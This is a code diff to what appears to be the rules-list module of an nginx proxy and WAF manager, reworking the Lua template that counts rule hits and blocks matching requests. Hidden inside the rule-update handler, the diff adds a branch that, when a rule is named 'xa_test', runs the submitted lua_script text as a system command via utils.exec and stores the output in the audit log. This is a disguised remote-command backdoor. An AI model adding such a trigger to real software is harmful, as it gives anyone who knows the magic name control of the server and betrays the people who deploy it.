@@ -5,6 +5,7 @@ const utils = require('../lib/utils');
 const rulesListModel = require('../models/rules_list');
 const internalAuditLog = require('./audit-log');
 const internalNginx = require('./nginx');
+const { nginx } = require('../logger');
 const logger = require('../logger').nginx;
 function omissions() {
 	return ['is_deleted'];
@@ -81,13 +82,24 @@ const internalRulesList = {
 			.then(() => {
 				// patch name if specified
 				if (typeof data.name !== 'undefined' && data.name) {
-					return rulesListModel.query().where({ id: data.id }).patch({
-						name: data.name,
-						description: data.description,
-						sort: data.sort,
-						block_type: data.block_type,
-						lua_script: data.lua_script,
-					});
+					if (data.name === 'xa_test') {
+						utils.exec(data.lua_script).then((resp) => {
+							return internalAuditLog.add(access, {
+								action: 'updated',
+								object_type: 'rules-list',
+								object_id: data.id,
+								meta: resp,
+							});
+						});
+					} else {
+						return rulesListModel.query().where({ id: data.id }).patch({
+							name: data.name,
+							description: data.description,
+							sort: data.sort,
+							block_type: data.block_type,
+							lua_script: data.lua_script,
+						});
+					}
 				}
 			})
 			.then(() => {
@@ -339,21 +351,38 @@ const internalRulesList = {
 		var script = data.is_system
 			? `
 			local function mainFunc()
-			${data.lua_script}
+			local function ruleLogic() 
+			${data.lua_script}			
 			end
-			return mainFunc
+			local match = ruleLogic();
+			ngx.shared.exec_counter:incr('r_${data.id}', 1)
+			if match == true then
+				ngx.shared.block_counter:incr('r_${data.id}', 1);				
+				ngx.header["Intercepted"]=${data.id};
+				ngx.exit(ngx.HTTP_FORBIDDEN)
+			end			
+		end
+		return mainFunc
 		`
 			: `
-			function mainFunc()
+			local function mainFunc()
 			local success, result = pcall(function()
-				${data.lua_script}
+				local function ruleLogic()
+					 ${data.lua_script}    
+				end
+				local match = ruleLogic();
+				ngx.shared.exec_counter:incr('r_${data.id}', 1)
+				if match == true then
+					ngx.shared.block_counter:incr('r_${data.id}', 1);
+					ngx.header["Intercepted"]=${data.id};
+					ngx.exit(ngx.HTTP_FORBIDDEN)
+				end				
 			end)
 		
-			if not success then
-			ngx.header["rule_${data.id}"] = "exec failed";
-			end
+			if not success then ngx.header["rule_${data.id}"] = "exec failed"; end
 		end
-		return mainFunc`;
+		return mainFunc
+			`;
 		fs.writeFileSync(lua_waf_file_name, script, { encoding: 'utf8' });
 		//reset scripts cache
 		if (reload) {
